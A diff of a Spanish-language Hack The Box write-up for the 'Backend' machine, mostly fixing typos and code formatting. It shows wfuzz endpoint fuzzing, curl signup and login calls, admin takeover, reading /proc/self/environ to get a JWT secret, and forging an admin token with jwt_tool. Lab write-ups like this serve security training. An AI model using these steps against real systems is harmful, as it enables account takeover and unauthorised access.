@@ -51,7 +51,7 @@ Probamos con POST
 wfuzz -c -X POST --hc=405,404  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://backend.htb/api/v1/user/FUZZ
 ```
 
-Encontramos `
+Encontramos 
 ```
 /api/v1/user/login 
 /api/v1/user/singup
@@ -66,15 +66,21 @@ Campos requeridos para loggearse
 
 ![Screenshot2](/assets/writeups/backend/2.png)
 
-Registramos usuario en el endpoint que encontramso anteriormente
-`curl -X POST "http://backend.htb/api/v1/user/signup" -H "Content-Type: application/json" -d '{"email":"foo2@bar.com","password":"foo"}'`
+Registramos usuario en el endpoint que encontramos anteriormente
+
+```
+curl -X POST "http://backend.htb/api/v1/user/signup" -H "Content-Type: application/json" -d '{"email":"foo2@bar.com","password":"foo"}'
+```
 
 Nos logeamos
-` curl "http://backend.htb/api/v1/user/login" -d "username=foo@bar.com&password=foo"`
+
+```
+curl "http://backend.htb/api/v1/user/login" -d "username=foo@bar.com&password=foo"
+```
 
 ![Screenshot3](/assets/writeups/backend/3.png)
 
-Seteamos el acces token a la funcionalidad de burpsuite match and replace para que cada solicitud que realicemos use el token
+Establecemos  el access token a la funcionalidad de burpsuite match and replace para que cada solicitud que realicemos use el token
 
 ![Screenshot4](/assets/writeups/backend/4.png)
 
@@ -97,7 +103,9 @@ La siguiente funcionalidad que llama la atencion es actualizar la contraseña do
 
 Obtenemos el token del administrador
 
-`curl "http://backend.htb/api/v1/user/login" -d "username=admin@htb.local&password=foo123"`
+```
+curl "http://backend.htb/api/v1/user/login" -d "username=admin@htb.local&password=foo123"
+```
 
 Cambiamos el token establecido anteriormente en el match & replace de burpsuite
 
@@ -111,7 +119,7 @@ Ahora tenemos acceso a nuevas funcionalidades, destacamos dos:
 
 
 
-leemos el archiv **/proc/self/environ** el cual almacena las **variables de entorno** del proceso que lo está consultando
+leemos el archivo **/proc/self/environ** el cual almacena las **variables de entorno** del proceso que lo está consultando
 
 
 ![Screenshot9](/assets/writeups/backend/9.png)
@@ -127,7 +135,7 @@ curl file:///home/ari/Descargas/response_1769381983740.json | jq '.file' -r > ma
 ![Screenshot11](/assets/writeups/backend/11.png)
 
 
-
+![Screenshot12](/assets/writeups/backend/12.png)
 
 con **jwt_tool** añadimos el campo debug= true
 
@@ -135,8 +143,6 @@ con **jwt_tool** añadimos el campo debug= true
 python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzcwMDg5NTY1LCJpYXQiOjE3NjkzOTgzNjUsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.GMdNhbWtHX9O-DaL89_0hYq_tCBpTrONPC4eBM7JBgo' -T -S hs256 -p 'SuperSecretSigningKey-HTB'
 ```
 
-
-![Screenshot12](/assets/writeups/backend/12.png)
 
 ![Screenshot13](/assets/writeups/backend/13.png)
 
